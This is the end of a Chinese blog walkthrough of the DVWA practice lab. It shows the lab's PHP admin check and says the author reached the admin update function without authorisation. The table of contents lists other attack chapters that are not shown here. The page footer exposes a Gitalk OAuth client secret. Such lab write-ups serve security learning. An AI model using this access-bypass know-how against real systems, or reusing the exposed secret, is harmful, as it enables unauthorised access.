<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Only the admin user is allowed to access this page.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Have a look at this file for possible vulnerabilities: </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">* vulnerabilities/authbypass/change_user_details.php</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">if</span> (dvwaCurrentUser() != <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Unauthorised&quot;</span>;<br>    http_response_code(<span class="hljs-number">403</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>HTML 页面和用于检索数据的 API 都已被锁定，但是跟新数据我们可以使用一下看看<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-21-17-42-18.png" alt="成功越权" class="lazyload"></p>
<p>成功越权使用了管理员的更新功能。</p>
<h2 id="DVWA-学习总结"><a href="#DVWA-学习总结" class="headerlink" title="DVWA 学习总结"></a>DVWA 学习总结</h2><p>学习完发现还需要学习很多知识才能完全理解漏洞原理，仍需要多复习和巩固，将欠缺的知识继续补充完整。仍有一些关卡没有复现需要查阅资料进行学习。</p>

  </article>

  
      
    <div class="nexmoe-post-copyright">
        <strong>本文作者：</strong>Jay jay<br>
        <strong>本文链接：</strong><a href="https://yyj-xx.github.io/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" title="https:&#x2F;&#x2F;yyj-xx.github.io&#x2F;2023&#x2F;03&#x2F;15&#x2F;DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;yyj-xx.github.io&#x2F;2023&#x2F;03&#x2F;15&#x2F;DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&#x2F;</a><br>
        
            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
        
    </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
    
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a>
    
</div>

  
      <div class="nexmoe-post-footer">
          <section class="nexmoe-comment">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css">
<div id="gitalk"></div>
<script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: '906d60a925bbfc786e36',
        clientSecret: 'eef34b48d710958974d793333753521d0474c243',
        id: window.location.pathname,
        repo: 'yyj-xx.github.io',
        owner: 'yyj-xx',
        admin: 'yyj-xx'
    })
    gitalk.render('gitalk')
</script>
</section>
      </div>
  
</div>
            <div class="nexmoe-post-right">
              <div class="nexmoe-fixed">
                  <div class="nexmoe-tool"> 
                    
                      
                        
                          
                          
                              <button class="mdui-fab catalog" style="overflow:unset;">
                                  <i class="nexmoefont icon-i-catalog"></i>
                                  <div class="nexmoe-toc">
                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">DVWA靶场简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA%E5%AE%89%E8%A3%85"><span class="toc-number">2.</span> <span class="toc-text">DVWA安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%88Brute-Force%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">DVWA – 暴力破解（Brute Force）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-Command-Injection%EF%BC%88%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">DVWA – Command Injection（命令注入）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3-%E2%80%93-CSRF"><span class="toc-number">5.</span> <span class="toc-text">DVWA靶场通关 – CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-file-inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">DVWA – file inclusion（文件包含）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-File-upload-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">7.</span> <span class="toc-text">DVWA – File upload(文件上传)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-SQL-Injection-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">DVWA –  SQL Injection (sql注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-SQL-Injection%EF%BC%88blind%EF%BC%89%E7%9B%B2%E6%B3%A8"><span class="toc-number">9.</span> <span class="toc-text">DVWA – SQL Injection（blind）盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-XSS-DOM"><span class="toc-number">10.</span> <span class="toc-text">DVWA – XSS(DOM)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-XSS-reflected-%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">11.</span> <span class="toc-text">DVWA – XSS(reflected)反射型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93XSS-Stored-%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">12.</span> <span class="toc-text">DVWA –XSS(Stored)存储型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-Weak-Session-ID-%E5%BC%B1%E4%BC%9A%E8%AF%9D"><span class="toc-number">13.</span> <span class="toc-text">DVWA – Weak Session ID(弱会话)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-Insecure-CAPTCHA-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-number">14.</span> <span class="toc-text">DVWA – Insecure CAPTCHA(不安全的验证码)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-Javascript"><span class="toc-number">15.</span> <span class="toc-text">DVWA – Javascript</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-CSP-Bypass-csp%E7%BB%95%E8%BF%87"><span class="toc-number">16.</span> <span class="toc-text">DVWA – CSP Bypass(csp绕过)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-Open-HTTP-Redirect"><span class="toc-number">17.</span> <span class="toc-text">DVWA – Open HTTP Redirect</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E2%80%93-Authorisation-Bypass"><span class="toc-number">18.</span> <span class="toc-text">DVWA – Authorisation Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93"><span class="toc-number">19.</span> <span class="toc-text">DVWA 学习总结</span></a></li></ol>
                                  </div>
                              </button>
                          
                          
                      
                    
                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
                  </div>
              </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

 

<script async src="/js/app.js?v=1681885929784"></script>

<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
<script>
	$(".justified-gallery").justifiedGallery({
		rowHeight: 160,
		margins: 10,
	});
</script>


    





</body>

</html>
